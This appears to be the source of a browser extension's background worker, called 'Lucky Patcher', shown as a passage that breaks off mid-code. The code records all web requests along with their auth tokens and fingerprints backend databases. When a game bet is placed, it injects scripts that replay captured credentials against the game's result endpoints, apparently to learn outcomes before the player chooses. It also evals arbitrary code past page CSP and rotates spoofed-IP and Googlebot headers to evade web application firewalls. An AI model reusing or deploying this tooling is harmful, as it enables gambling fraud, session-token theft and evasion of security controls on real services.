// Lucky Patcher – Background Service Worker v2
// Inline db-detector + full Trace engine with WAF bypass, CDN origin hunting, DoH, geolocation.

// ── Inlined: db-detector.js ───────────────────────────────────────────────────

function detectStack(entry) {
  const result = { databases: [], orm: null, framework: null, cloud: null, apiStyle: null, confidence: "low", evidence: [] };
  const url = (entry.url || "").toLowerCase();
  const domain = (entry.domain || "").toLowerCase();
  const headers = { ...(entry.responseHeaders || {}), ...(entry.requestHeaders || {}) };
  const body = (entry.responseBody || "").toLowerCase();

  const urlChecks = [
    { pattern: /firebaseio\.com|firestore\.googleapis\.com|firebase\.google\.com/, db: "Firebase / Firestore", cloud: "Google Cloud", confidence: "high" },
    { pattern: /\.supabase\.co|supabase\.in/, db: "PostgreSQL", cloud: "Supabase", confidence: "high" },
    { pattern: /\.neon\.tech/, db: "PostgreSQL", cloud: "Neon", confidence: "high" },
    { pattern: /psdb\.cloud|planetscale\.com/, db: "MySQL (PlanetScale)", cloud: "PlanetScale", confidence: "high" },
    { pattern: /cockroachlabs\.cloud|cockroachdb\.com/, db: "CockroachDB (PostgreSQL-compat)", cloud: "CockroachDB", confidence: "high" },
    { pattern: /upstash\.io/, db: "Redis", cloud: "Upstash", confidence: "high" },
    { pattern: /redislabs\.com/, db: "Redis", cloud: "Redis Cloud", confidence: "high" },
    { pattern: /astra\.datastax\.com/, db: "Cassandra", cloud: "DataStax Astra", confidence: "high" },
    { pattern: /dynamodb\.|\.amazonaws\.com.*dynamodb/, db: "DynamoDB", cloud: "AWS", confidence: "high" },
    { pattern: /rds\.amazonaws\.com/, db: "MySQL / PostgreSQL / SQL Server (RDS)", cloud: "AWS RDS", confidence: "high" },
    { pattern: /mongo\.net|mongodb\.net|atlas\.mongodb\.com/, db: "MongoDB Atlas", cloud: "MongoDB Atlas", confidence: "high" },
    { pattern: /elastic\.co|\.es\.io|elasticsearch/, db: "Elasticsearch", cloud: "Elastic Cloud", confidence: "high" },
    { pattern: /influxdata\.com|influxdb/, db: "InfluxDB", confidence: "high" },
    { pattern: /tidbcloud\.com/, db: "TiDB (MySQL-compat)", cloud: "TiDB Cloud", confidence: "high" },
    { pattern: /turso\.io|\.turso\.tech/, db: "SQLite (libSQL/Turso)", cloud: "Turso", confidence: "high" },
    { pattern: /xata\.io/, db: "PostgreSQL", cloud: "Xata", confidence: "high" },
    { pattern: /convex\.cloud/, db: "Convex (document DB)", cloud: "Convex", confidence: "high" },
    { pattern: /appwrite\.io/, db: "Appwrite (document DB)", cloud: "Appwrite", confidence: "high" },
    { pattern: /pocketbase\.io/, db: "SQLite (PocketBase)", confidence: "high" },
    { pattern: /hasura\.app|hasura\.io/, db: "PostgreSQL (via Hasura)", confidence: "high" },
    { pattern: /fauna\.com|db\.fauna\.com/, db: "FaunaDB", cloud: "Fauna", confidence: "high" },
    { pattern: /dgraph\.io/, db: "Dgraph (GraphDB)", confidence: "high" },
    { pattern: /\/graphql($|\/)/, apiStyle: "GraphQL" },
    { pattern: /\/_api\/|\/api\/odata/, apiStyle: "OData (likely MSSQL/Azure)" },
    { pattern: /\/rest\/v\d|\/api\/v\d/, apiStyle: "REST" },
    { pattern: /\/trpc\//, apiStyle: "tRPC" },
    { pattern: /\/jsonrpc/, apiStyle: "JSON-RPC" },
  ];
  for (const check of urlChecks) {
    if (check.pattern.test(url) || check.pattern.test(domain)) {
      if (check.db && !result.databases.includes(check.db)) result.databases.push(check.db);
      if (check.cloud) result.cloud = check.cloud;
      if (check.apiStyle) result.apiStyle = check.apiStyle;
      if (check.confidence === "high") result.confidence = "high";
      result.evidence.push("URL match: " + check.pattern.source.slice(0, 60));
    }
  }

  const h = Object.fromEntries(Object.entries(headers).map(([k, v]) => [k.toLowerCase(), (v || "").toLowerCase()]));
  const headerChecks = [
    { header: "x-powered-by", pattern: /php/, framework: "PHP", db: "MySQL / MariaDB / PostgreSQL" },
    { header: "x-powered-by", pattern: /asp\.net/, framework: "ASP.NET", db: "SQL Server / Azure SQL" },
    { header: "x-powered-by", pattern: /express/, framework: "Express.js (Node)" },
    { header: "x-powered-by", pattern: /next\.js/, framework: "Next.js" },
    { header: "x-powered-by", pattern: /laravel/, framework: "Laravel (PHP)", db: "MySQL" },
    { header: "x-powered-by", pattern: /rails|rack/, framework: "Ruby on Rails", db: "PostgreSQL / MySQL" },
    { header: "x-powered-by", pattern: /django|python/, framework: "Django (Python)", db: "PostgreSQL / MySQL / SQLite" },
    { header: "x-powered-by", pattern: /spring|java/, framework: "Spring (Java)", db: "MySQL / PostgreSQL / Oracle" },
    { header: "server", pattern: /nginx/, framework: "Nginx" },
    { header: "server", pattern: /angie/, framework: "Angie (Russian Nginx fork)" },
    { header: "server", pattern: /apache/, framework: "Apache" },
    { header: "server", pattern: /iis/, framework: "IIS (Microsoft)", db: "SQL Server" },
    { header: "server", pattern: /cloudflare/, cloud: "Cloudflare" },
    { header: "server", pattern: /vercel/, cloud: "Vercel" },
    { header: "server", pattern: /heroku/, cloud: "Heroku" },
    { header: "server", pattern: /litespeed/, framework: "LiteSpeed" },
    { header: "server", pattern: /openresty/, framework: "OpenResty (Nginx+Lua)" },
    { header: "server", pattern: /caddy/, framework: "Caddy" },
    { header: "server", pattern: /gunicorn/, framework: "Gunicorn (Python)" },
    { header: "server", pattern: /uvicorn/, framework: "Uvicorn (Python ASGI)" },
    { header: "server", pattern: /oracle/, db: "Oracle DB", framework: "Oracle Application Server" },
    { header: "x-db-host", present: true, evidence: "x-db-host header exposed" },
    { header: "x-database", present: true, evidence: "x-database header exposed" },
    { header: "x-mongo-objectid", present: true, db: "MongoDB" },
    { header: "x-cassandra-cluster", present: true, db: "Cassandra" },
    { header: "x-hasura-role", present: true, db: "PostgreSQL (via Hasura)" },
    { header: "x-amzn-requestid", present: true, cloud: "AWS" },
    { header: "x-amzn-trace-id", present: true, cloud: "AWS" },
    { header: "x-ms-request-id", present: true, cloud: "Azure" },
    { header: "x-ms-correlation-request-id", present: true, cloud: "Azure" },
    { header: "x-goog-request-id", present: true, cloud: "Google Cloud" },
    { header: "x-firebase-appcheck", present: true, db: "Firebase / Firestore", cloud: "Google Cloud" },
    { header: "x-vercel-id", present: true, cloud: "Vercel" },
    { header: "x-netlify", present: true, cloud: "Netlify" },
    { header: "fly-request-id", present: true, cloud: "Fly.io" },
    { header: "render-request-id", present: true, cloud: "Render" },
    { header: "x-railway-request-id", present: true, cloud: "Railway" },
    { header: "cf-ray", present: true, cloud: "Cloudflare" },
    { header: "x-akamai-edgescape", present: true, cloud: "Akamai CDN" },
    { header: "x-fastly-request-id", present: true, cloud: "Fastly CDN" },
    { header: "x-cache", present: true, evidence: "CDN/proxy cache layer detected" },
    { header: "x-served-by", present: true, evidence: "Served-by header reveals proxy/CDN node" },
    { header: "via", present: true, evidence: "Via header — proxy chain detected" },
    { header: "content-type", pattern: /application\/graphql/, apiStyle: "GraphQL" },
    { header: "content-type", pattern: /application\/xml|text\/xml/, apiStyle: "SOAP / XML API" },
  ];

  for (const check of headerChecks) {
    const val = h[check.header];
    if (val === undefined) continue;
    const matched = (check.present && val !== undefined) || (check.pattern && check.pattern.test(val));
    if (matched) {
      if (check.db && !result.databases.includes(check.db)) result.databases.push(check.db);
      if (check.framework) result.framework = check.framework;
      if (check.cloud) result.cloud = check.cloud;
      if (check.apiStyle) result.apiStyle = check.apiStyle;
      if (result.confidence === "low") result.confidence = "medium";
      result.evidence.push(check.evidence || (check.header + ": " + val.slice(0, 80)));
    }
  }

  if (body) {
    const bodyChecks = [
      { pattern: /pgsql|psql|postgresql|psqlexception|duplicate key value violates unique constraint|sqlstate\[|pg_exception/, db: "PostgreSQL" },
      { pattern: /you have an error in your sql syntax|duplicate entry .+ for key|mysql_|mariadb|com\.mysql\.jdbc/, db: "MySQL / MariaDB" },
      { pattern: /sqlite_error|sqlite_constraint|no such table|sqlite3|pysqlite|android\.database\.sqlite/, db: "SQLite" },
      { pattern: /\bora-\d{5}\b|plsql|oracle\.jdbc|sqlplus/, db: "Oracle DB" },
      { pattern: /invalid column name|incorrect syntax near|sqlexception|microsoft\.data\.sqlclient|system\.data\.sqlclient|mssql/, db: "SQL Server" },
      { pattern: /mongoerror|mongoclient|e11000 duplicate key error|cast to objectid failed|bson\.objectid|mongodb:\/\/|\$oid/, db: "MongoDB" },
      { pattern: /redis_error|rediserror|ioredis|jedis|stackexchange\.redis/, db: "Redis" },
      { pattern: /elasticsearch|index_not_found_exception|org\.elasticsearch|opensearch/, db: "Elasticsearch / OpenSearch" },
      { pattern: /dynamodb|conditioncheckfailedexception|provisionedthroughputexceededexception|resourcenotfoundexception.*dynamo/, db: "DynamoDB" },
      { pattern: /cassandraexception|com\.datastax\.|nosuchelementexception.*cassandra/, db: "Cassandra" },
      { pattern: /firestore|firebase.*database|projects\/.*\/databases|cloud\.google\.com\/firestore/, db: "Firebase / Firestore" },
      { pattern: /cockroachdb|crdb_internal/, db: "CockroachDB" },
      { pattern: /faunadb|com\.fauna/, db: "FaunaDB" },
      { pattern: /prismaclientknownrequesterror|prismacliente|@prisma\/client/, orm: "Prisma" },
      { pattern: /sqlalchemy\.exc|sqlalchemy\.orm/, orm: "SQLAlchemy (Python)" },
      { pattern: /org\.hibernate|javax\.persistence|jakarta\.persistence/, orm: "Hibernate / JPA (Java)" },
      { pattern: /django\.db|django\.core\.exceptions|models\.py/, orm: "Django ORM", framework: "Django" },
      { pattern: /activerecord::|activesupport::|rails/, orm: "ActiveRecord", framework: "Rails" },
      { pattern: /illuminate\\database|eloquent|laravel/, orm: "Eloquent (Laravel)", framework: "Laravel" },
      { pattern: /typeorm|queryrunner/, orm: "TypeORM" },
      { pattern: /drizzle-orm/, orm: "Drizzle ORM" },
      { pattern: /mongoose|validatorerror|casttoobjectid/, orm: "Mongoose (MongoDB)" },
      { pattern: /sequelize|sequelizeuniqueconstrainterror/, orm: "Sequelize" },
      { pattern: /"errors"\s*:\s*\[.*"message"/, apiStyle: "GraphQL" },
      { pattern: /at Object\.<anonymous>|node_modules\//, framework: "Node.js" },
      { pattern: /at org\.springframework|at java\./, framework: "Spring (Java)" },
      { pattern: /traceback \(most recent call last\)|file ".*\.py"/, framework: "Python" },
      { pattern: /in vendor\/bundle|\.rb:\d+:in/, framework: "Ruby" },
    ];
    for (const check of bodyChecks) {
      if (check.pattern.test(body)) {
        if (check.db && !result.databases.includes(check.db)) result.databases.push(check.db);
        if (check.orm) result.orm = check.orm;
        if (check.framework) result.framework = check.framework;
        if (check.apiStyle) result.apiStyle = check.apiStyle;
        if (result.confidence === "low") result.confidence = "medium";
        result.evidence.push("Body match: " + check.pattern.source.slice(0, 60));
      }
    }
    const connStringPatterns = [
      { re: /postgresql:\/\/[^\s"'<>]+|postgres:\/\/[^\s"'<>]+/, db: "PostgreSQL", severity: "CRITICAL — connection string exposed" },
      { re: /mysql:\/\/[^\s"'<>]+/, db: "MySQL", severity: "CRITICAL — connection string exposed" },
      { re: /mongodb(\+srv)?:\/\/[^\s"'<>]+/, db: "MongoDB", severity: "CRITICAL — connection string exposed" },
      { re: /redis:\/\/[^\s"'<>]+/, db: "Redis", severity: "CRITICAL — connection string exposed" },
      { re: /sqlserver:\/\/[^\s"'<>]+|mssql:\/\/[^\s"'<>]+/, db: "SQL Server", severity: "CRITICAL — connection string exposed" },
      { re: /amqp:\/\/[^\s"'<>]+/, db: "RabbitMQ / AMQP", severity: "CRITICAL — broker URI exposed" },
    ];
    for (const cp of connStringPatterns) {
      if (cp.re.test(body)) {
        if (!result.databases.includes(cp.db)) result.databases.push(cp.db);
        result.confidence = "high";
        result.evidence.push("⚠ " + cp.severity);
      }
    }
  }

  if (result.databases.length > 0 || result.framework || result.cloud) {
    if (result.confidence === "low") result.confidence = "medium";
  }
  if (result.databases.length === 0 && !result.framework && !result.cloud && !result.apiStyle) return null;
  return result;
}

function stackLabel(stack) {
  if (!stack) return null;
  const parts = [];
  if (stack.databases.length) parts.push(stack.databases[0]);
  if (stack.orm) parts.push(stack.orm);
  if (stack.framework) parts.push(stack.framework);
  if (stack.cloud) parts.push(stack.cloud);
  return parts.join(" · ") || null;
}

// ── Capture store ─────────────────────────────────────────────────────────────
const MAX_ENTRIES = 3000;
const STORAGE_KEY = "lp_captures";
let captures = [];
const _pendingExec = {};
let idCounter = 0;

chrome.storage.local.get([STORAGE_KEY], (result) => {
  if (result[STORAGE_KEY]) {
    captures = result[STORAGE_KEY];
    idCounter = captures.reduce((max, c) => Math.max(max, c.id || 0), 0) + 1;
  }
});

function save() { chrome.storage.local.set({ [STORAGE_KEY]: captures.slice(-MAX_ENTRIES) }); }

// ── Auto-probe intel (MakeBet → instant GetCurrentWin) ─────────────────────
let autoGameIntelData = null;

function addCapture(entry) {
  if (entry.captureType === "http" || entry.captureType === "fetch" || entry.captureType === "xhr") {
    const stack = detectStack(entry);
    if (stack) { entry.stackInfo = stack; entry.stackLabel = stackLabel(stack); }
  }
  entry.id = idCounter++;
  captures.push(entry);
  if (captures.length > MAX_ENTRIES) captures.shift();
  save();
  chrome.runtime.sendMessage({ type: "NEW_CAPTURE", entry }).catch(() => {});

  // ── Auto-probe: detect MakeBet and immediately probe GetCurrentWin ────────
  if (entry.url && /\/games-frame\/service-api\/games-[\w-]+\/MakeBet\b/i.test(entry.url)) {
    triggerMakeBetIntel(entry);
  }
}

// Fires immediately when MakeBet is captured — probes GetCurrentWin before user picks a cell
async function triggerMakeBetIntel(capture) {
  const gameUrlMatch = capture.url.match(/\/games-frame\/service-api\/(games-[\w-]+)\//i);
  if (!gameUrlMatch) return;

  const gamePath = gameUrlMatch[1];
  const gameName = gamePath.replace(/^games-/i, "");
  let origin = "";
  try { origin = new URL(capture.url).origin; } catch {}
  const gameBaseUrl = origin + "/games-frame/service-api/" + gamePath + "/";

  let urlQP = {};
  try { const pu = new URL(capture.url); pu.searchParams.forEach((v, k) => { urlQP[k] = v; }); } catch {}
  const giLang   = urlQP.language || "en";
  const giWhence = urlQP.whence   || "114";
  const giQS     = "language=" + giLang + "&whence=" + giWhence;

  let giReqBody = {};
  try { if (capture.requestBody) giReqBody = JSON.parse(capture.requestBody); } catch {}

  // Build read-only probe body (strip write-only MakeAction fields)
  const giPostBody = Object.assign({}, giReqBody);
  if (!giPostBody.WH && giWhence) giPostBody.WH = parseInt(giWhence) || 114;
  if (!giPostBody.LG && giLang)   giPostBody.LG = giLang;
  delete giPostBody.UC; delete giPostBody.ANS; delete giPostBody.ANT;

  // Auth headers
  const captHdrs = capture.requestHeaders || {};
  const giHeaders = { "content-type": "application/json", "accept": "application/json" };
  const xAuth = captHdrs["x-auth"] || captHdrs["X-Auth"] || captHdrs["X-AUTH"];
  if (xAuth) giHeaders["x-auth"] = xAuth;
  const authHdr = captHdrs["authorization"] || captHdrs["Authorization"];
  if (authHdr && !xAuth) giHeaders["authorization"] = authHdr;

  const intel = {
    gameName, gamePath, gameBaseUrl,
    accountId: giReqBody.UI || giReqBody.ui || null,
    betSize:   giReqBody.BS || giReqBody.bs || null,
    gameType:  giReqBody.GT || giReqBody.gt || null,
    capturedAt: Date.now(),
    status: "probing",
    endpoints: [],
    rawResponses: {},
    currentWin: null,
    activeGame: null,
  };

  autoGameIntelData = intel;
  // Broadcast "probing" state immediately so popup shows spinner
  chrome.runtime.sendMessage({ type: "LIVE_INTEL", intel: { ...intel } }).catch(() => {});

  // Capture original content-type so we can mirror it on probes
  const origContentType = captHdrs["content-type"] || captHdrs["Content-Type"] || "";
  const origRawBody = capture.requestBody || "";

  // Probe GetActiveGame FIRST to get AN, GT, BS before probing GetCurrentWin
  // All other read endpoints follow. GetCurrentWin is tried last so AN is always seeded.
  const probeEndpoints = ["GetActiveGame", "GetCurrentWin", "GetLastResult", "GetBalance"];
  const tabId = capture.tabId && capture.tabId > 0 ? capture.tabId : null;

  for (const ep of probeEndpoints) {
    // Build base QS — starts with language/whence, session params appended per-probe below
    const baseQS = giQS;
    const baseEpUrl = gameBaseUrl + ep + "?" + baseQS;

    try {
      let result = null;
      if (tabId) {
        // Snapshot current session state for this probe (mutable giPostBody updated in-loop)
        const sessionSnap = Object.assign({}, giPostBody);

        const [execResult] = await chrome.scripting.executeScript({
          target: { tabId },
          // Three-strategy probe — runs inside game tab so cookies/CF clearance are live:
          //   1. POST JSON (mirrors most backend APIs)
          //   2. GET with all session params in query string (works for read-only GET endpoints)
          //   3. POST form-encoded (fallback for endpoints that reject JSON content-type)
          func: async (baseUrl, baseQS, session, hdrs, origBody, origCT) => {
            const baseHdrs = { accept: "application/json, text/plain, */*" };
            if (hdrs["x-auth"])        baseHdrs["x-auth"]        = hdrs["x-auth"];
            if (hdrs["authorization"]) baseHdrs["authorization"] = hdrs["authorization"];

            // Build a GET URL that carries ALL session params in the query string
            const allParams = new URLSearchParams(baseQS);
            for (const [k, v] of Object.entries(session)) {
              if (v !== undefined && v !== null) allParams.set(k, String(v));
            }
            const getUrl = baseUrl.replace(/\?.*$/, "") + "?" + allParams.toString();

            // Helper: attempt a single fetch, return { status, body, method } or { error }
            async function attempt(method, url, extraHdrs, body) {
              try {
                const r = await fetch(url, { method, headers: { ...baseHdrs, ...extraHdrs }, body, credentials: "include" });
                const text = await r.text();
                return { status: r.status, body: text, method };
              } catch (e) { return { error: String(e), method }; }
            }

            // Strategy 1: POST JSON (standard)
            const s1 = await attempt("POST", baseUrl,
              { "content-type": "application/json" },
              JSON.stringify(session));
            if (s1.status === 200) return s1;

            // Strategy 2: GET with all params in query string (works for read-only endpoints)
            const s2 = await attempt("GET", getUrl, {}, undefined);
            if (s2.status === 200) return s2;

            // Strategy 3: POST form-encoded (some Angie/PHP backends expect this)
            const s3 = await attempt("POST", getUrl,
              { "content-type": "application/x-www-form-urlencoded" },
              new URLSearchParams(Object.fromEntries(
                Object.entries(session).map(([k, v]) => [k, String(v ?? "")])
              )).toString());
            if (s3.status === 200) return s3;

            // Strategy 4: replay original MakeBet body verbatim (same format server already accepted)
            if (origBody) {
              const s4 = await attempt("POST", baseUrl,
                { "content-type": origCT || "application/json" },
                origBody);
              if (s4.status === 200) return s4;
            }

            // Return best non-200 result for diagnostic logging
            return s3.status ? s3 : s2.status ? s2 : s1;
          },
          args: [baseEpUrl, baseQS, sessionSnap, giHeaders, origRawBody, origContentType],
        });
        result = execResult?.result;
      }

      if (result && result.status === 200 && result.body) {
        try {
          const parsed = JSON.parse(result.body);
          intel.rawResponses[ep] = parsed;
          intel.endpoints.push({ name: ep, status: 200, hasData: true, method: result.method });
          // Seed session params from response into subsequent probes
          const an = parsed.AN ?? parsed.an;
          if (ep === "GetCurrentWin" || ep === "GetLastResult") {
            intel.currentWin = parsed;
            if (an !== undefined) giPostBody.AN = an;
          }
          if (ep === "GetActiveGame") {
            intel.activeGame = parsed;
            // Critically: seed AN before GetCurrentWin is probed
            if (an !== undefined) giPostBody.AN = an;
            if (parsed.GT !== undefined && giPostBody.GT === undefined) giPostBody.GT = parsed.GT;
            if (parsed.BS !== undefined && giPostBody.BS === undefined) giPostBody.BS = parsed.BS;
            if (parsed.UI !== undefined && giPostBody.UI === undefined) giPostBody.UI = parsed.UI;
            if (parsed.AI !== undefined && giPostBody.AI === undefined) giPostBody.AI = parsed.AI;
          }
        } catch {
          intel.endpoints.push({ name: ep, status: 200, hasData: false, note: "non-JSON", method: result.method });
        }
      } else if (result && !result.error) {
        intel.endpoints.push({ name: ep, status: result.status || 0, hasData: false, method: result.method });
      } else {
        intel.endpoints.push({ name: ep, status: 0, hasData: false,
          note: result?.error || (tabId ? "exec failed" : "no tabId") });
      }
    } catch (e) {
      intel.endpoints.push({ name: ep, status: 0, hasData: false, error: String(e) });
    }
  }

  intel.status = "ready";
  autoGameIntelData = intel;
  chrome.runtime.sendMessage({ type: "LIVE_INTEL", intel: { ...intel } }).catch(() => {});
}

// ── webRequest ────────────────────────────────────────────────────────────────
const pendingRequests = new Map();

chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    const entry = {
      captureType: "http", id: null, requestId: details.requestId,
      tabId: details.tabId, url: details.url, domain: extractDomain(details.url),
      method: details.method, type: details.type, initiator: details.initiator || "unknown",
      timestamp: Date.now(), status: "pending", statusCode: null,
      requestBody: null, requestHeaders: {}, responseSize: null, duration: null,
    };
    if (details.requestBody) {
      if (details.requestBody.formData) entry.requestBody = JSON.stringify(details.requestBody.formData).slice(0, 8000);
      else if (details.requestBody.raw) {
        try { const raw = details.requestBody.raw[0]?.bytes; if (raw) entry.requestBody = new TextDecoder().decode(raw).slice(0, 8000); } catch {}
      }
    }
    pendingRequests.set(details.requestId, entry);
  },
  { urls: ["*://*/*"] }, ["requestBody"]
);

// ── Capture request headers (including x-auth Bearer tokens) ─────────────────
chrome.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    const entry = pendingRequests.get(details.requestId);
    if (!entry) return;
    entry.requestHeaders = simplifyHeaders(details.requestHeaders || []);
  },
  { urls: ["*://*/*"] }, ["requestHeaders", "extraHeaders"]
);

chrome.webRequest.onCompleted.addListener(
  (details) => {
    const entry = pendingRequests.get(details.requestId);
    if (!entry) return;
    pendingRequests.delete(details.requestId);
    entry.statusCode = details.statusCode; entry.status = "completed";
    entry.duration = Date.now() - entry.timestamp;
    entry.responseHeaders = simplifyHeaders(details.responseHeaders || []);
    entry.responseSize = getContentLength(details.responseHeaders || []);
    addCapture(entry);
  },
  { urls: ["*://*/*"] }, ["responseHeaders"]
);

chrome.webRequest.onErrorOccurred.addListener(
  (details) => {
    const entry = pendingRequests.get(details.requestId);
    if (!entry) return;
    pendingRequests.delete(details.requestId);
    entry.status = "error"; entry.error = details.error;
    entry.duration = Date.now() - entry.timestamp;
    addCapture(entry);
  },
  { urls: ["*://*/*"] }
);

// ── Messages ──────────────────────────────────────────────────────────────────
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg && msg.captureType) {
    addCapture({ ...msg, id: null, tabId: sender.tab?.id, tabUrl: sender.tab?.url, frameId: sender.frameId, timestamp: msg.timestamp || Date.now() });
    return;
  }
  if (msg.type === "GET_CAPTURES") {
    const { filter = {}, page = 0, pageSize = 100 } = msg;
    let filtered = [...captures].reverse();
    if (filter.captureType) filtered = filtered.filter((c) => c.captureType === filter.captureType);
    if (filter.stackOnly) filtered = filtered.filter((c) => c.stackInfo);
    if (filter.domain) { const q = filter.domain.toLowerCase(); filtered = filtered.filter((c) => (c.domain || "").toLowerCase().includes(q) || (c.url || "").toLowerCase().includes(q)); }
    if (filter.search) { const q = filter.search.toLowerCase(); filtered = filtered.filter((c) => JSON.stringify(c).toLowerCase().includes(q)); }
    sendResponse({ captures: filtered.slice(page * pageSize, (page + 1) * pageSize), total: filtered.length });
    return true;
  }
  if (msg.type === "CLEAR_CAPTURES") { captures = []; save(); sendResponse({ ok: true }); return true; }
  if (msg.type === "EXPORT_CAPTURES") { sendResponse({ data: JSON.stringify(captures, null, 2) }); return true; }
  if (msg.type === "GET_STATS") { sendResponse(computeStats(captures)); return true; }


  if (msg.type === "EXEC_SCRIPT") {
    var _execTabId = msg.tabId;
    var _execCode  = msg.code;
    var _execStart = Date.now();
    var _execReqId = "exec_" + Date.now() + "_" + Math.random().toString(36).slice(2);

    _pendingExec[_execReqId] = { sendResponse, startTime: _execStart };

    // Route through content-script.js (MAIN world, manifest-loaded) so page CSP
    // does not block eval — extension content scripts are trusted and bypass page CSP.
    chrome.tabs.sendMessage(_execTabId, { type: "EXEC_CODE", code: _execCode, reqId: _execReqId }, function() {
      if (chrome.runtime.lastError) {
        var p = _pendingExec[_execReqId];
        if (p) {
          delete _pendingExec[_execReqId];
          p.sendResponse({ error: "Content script not ready: " + chrome.runtime.lastError.message, timing: Date.now() - _execStart });
        }
      }
    });
    return true;
  }

  if (msg.type === "EXEC_RESULT") {
    var p = _pendingExec[msg.reqId];
    if (p) {
      delete _pendingExec[msg.reqId];
      var timing = Date.now() - p.startTime;
      if (msg.error) p.sendResponse({ error: msg.error, timing });
      else p.sendResponse({ result: msg.result, timing });
    }
    return false;
  }


  if (msg.type === "TRACE_REQUEST") { runTrace(msg.capture, msg.traceId, msg.tabId); sendResponse({ ok: true }); return true; }
  if (msg.type === "REPLAY_REQUEST") { runReplay(msg.capture, msg.replayId, msg.tabId, msg.overrides || {}); sendResponse({ ok: true }); return true; }
  if (msg.type === "GET_LIVE_INTEL") { sendResponse({ intel: autoGameIntelData }); return true; }
  if (msg.type === "CLEAR_LIVE_INTEL") { autoGameIntelData = null; sendResponse({ ok: true }); return true; }
});

// ── Trace Engine v2 ───────────────────────────────────────────────────────────
const activeTraces = new Map();

function traceLog(traceId, level, text, data) {
  chrome.runtime.sendMessage({ type: "TRACE_LOG", entry: { traceId, level, text, data: data || null, ts: Date.now() } }).catch(() => {});
}
function traceDone(traceId, report) {
  chrome.runtime.sendMessage({ type: "TRACE_DONE", traceId, report }).catch(() => {});
}

// WAF bypass header sets — rotate through these to avoid detection
const WAF_BYPASS_HEADERS = [
  // Appear to come from trusted IPs
  { "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "X-Originating-IP": "127.0.0.1" },
  { "X-Forwarded-For": "10.0.0.1", "X-Real-IP": "10.0.0.1", "CF-Connecting-IP": "10.0.0.1" },
  { "X-Forwarded-For": "192.168.1.1", "X-Remote-IP": "192.168.1.1", "X-Remote-Addr": "192.168.1.1" },
  // Appear to be from Googlebot/scanner
  { "X-Forwarded-For": "66.249.66.1", "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)" },
  // Appear to bypass content negotiation
  { "Accept": "*/*", "Accept-Encoding": "identity", "Cache-Control": "no-cache" },
];

// CDN fingerprints → potential bypass techniques
const CDN_SIGNATURES = {
  cloudflare: { headers: ["cf-ray", "cf-cache-status"], bypass: ["X-Forwarded-For: 127.0.0.1", "CF-Connecting-IP: 127.0.0.1"] },
  akamai:     { headers: ["x-akamai-edgescape", "x-check-cacheable", "akamai-cache-status"], bypass: ["Pragma: akamai-x-check-cacheable"] },
  fastly:     { headers: ["x-fastly-request-id", "x-served-by", "x-cache-hits"], bypass: ["Fastly-Debug: 1"] },
  cloudfront: { headers: ["x-amz-cf-id", "x-amz-cf-pop"], bypass: [] },
  incapsula:  { headers: ["x-iinfo", "x-cdn"], bypass: ["X-Forwarded-For: 127.0.0.1"] },
  sucuri:     { headers: ["x-sucuri-id", "x-sucuri-cache"], bypass: [] },
  imperva:    { headers: ["x-iinfo"], bypass: ["X-Forwarded-For: 127.0.0.1"] },
};

// WAF signatures to detect
const WAF_SIGNATURES = {
  cloudflare_waf: /attention required|cloudflare|just a moment|cf-browser-verification/i,
  modsecurity:    /mod_security|not acceptable|406|this request has been blocked/i,
  wordfence:      /wordfence|generated by wordfence/i,
  sucuri_waf:     /sucuri website firewall|access denied.*sucuri/i,
  imperva_waf:    /incapsula|request unsuccessful/i,
  akamai_waf:     /reference\s*#\d+\.\d+\.\d+|access denied.*akamai/i,
  f5_bigip:       /the requested url was rejected|f5 networks|bigip/i,
  barracuda:      /barracuda|request blocked/i,
};

async function runTrace(capture, traceId, tabId) {
  activeTraces.set(traceId, true);

  const report = {
    url: capture.url || "",
    capturedStatus: parseInt(capture.statusCode || capture.status) || null,
    capturedBody: capture.responseBody || null,
    domain: capture.domain || extractDomain(capture.url || ""),
    chain: [],
    databases: [],
    frameworks: [],
    clouds: [],
    orms: [],
    apiStyles: [],
    evidence: [],
    cloudflare: false,
    cfBypassed: false,
    cdnLayer: null,
    cdnBypassed: false,
    wafDetected: null,
    wafBypassed: false,
    originIPs: [],
    geoInfo: [],
    jwtFound: null,
    dataFields: [],
    severity: [],
    probes: [],
    fullResponses: [],
    thirdPartyChain: [],
    dnsRecords: [],
    serverHosting: null,
    proxyChain: [],
  };

  const origin = (() => { try { const u = new URL(capture.url || ""); return u.protocol + "//" + u.host; } catch { return null; } })();
  const targetDomain = report.domain;
  if (!origin) { traceDone(traceId, report); return; }

  traceLog(traceId, "info", "═══ Lucky Patcher Trace v2 ═══");
  traceLog(traceId, "info", "Target: " + targetDomain);

  // ── Helper: probe via tab (CF clearance) ──────────────────────────────────
  async function probeViaTab(url, opts = {}) {
    if (!tabId) return null;
    try {
      const results = await chrome.scripting.executeScript({
        target: { tabId },
        func: async (url, opts) => {
          try {
            const ctrl = new AbortController();
            const t = setTimeout(() => ctrl.abort(), opts.timeout || 10000);
            const res = await fetch(url, {
              method: opts.method || "GET",
              headers: { ...opts.headers },
              body: opts.body || undefined,
              credentials: "include",
              redirect: opts.noFollow ? "manual" : "follow",
              signal: ctrl.signal,
            });
            clearTimeout(t);
            const hdrs = {};
            res.headers.forEach((v, k) => { hdrs[k] = v; });
            const ct = res.headers.get("content-type") || "";
            let body = null;
            if (ct.includes("json") || ct.includes("text") || ct.includes("html") || ct.includes("xml")) {
              body = await res.text().then(t => t.slice(0, 8000)).catch(() => null);
            }
            return { status: res.status, finalUrl: res.url, headers: hdrs, body };
          } catch (e) { return { error: e.message }; }
        },
        args: [url, opts],
      });
      return results?.[0]?.result || null;
    } catch { return null; }
  }

  // ── Helper: analyze probe result ──────────────────────────────────────────
  function analyzeResult(label, url, result, bypassHeaders = {}) {
    if (!result || result.error) {
      report.probes.push({ label, url, error: result?.error || "no response", findings: [] });
      return;
    }

    const headers = result.headers || {};
    const body = result.body || "";
    const bodyLow = body.toLowerCase();
    const probe = {
      label, url,
      status: result.status,
      finalUrl: result.finalUrl,
      headers: { ...headers },
      bodyExcerpt: body.slice(0, 2000),
      bypassHeaders: Object.keys(bypassHeaders).length ? bypassHeaders : null,
      findings: [],
      waf: null,
      cdn: null,
      serverInfo: {},
    };

    // Server info
    const interesting = ["server","x-powered-by","via","x-cache","x-served-by","x-backend",
      "x-version","x-request-id","x-frame-options","content-security-policy",
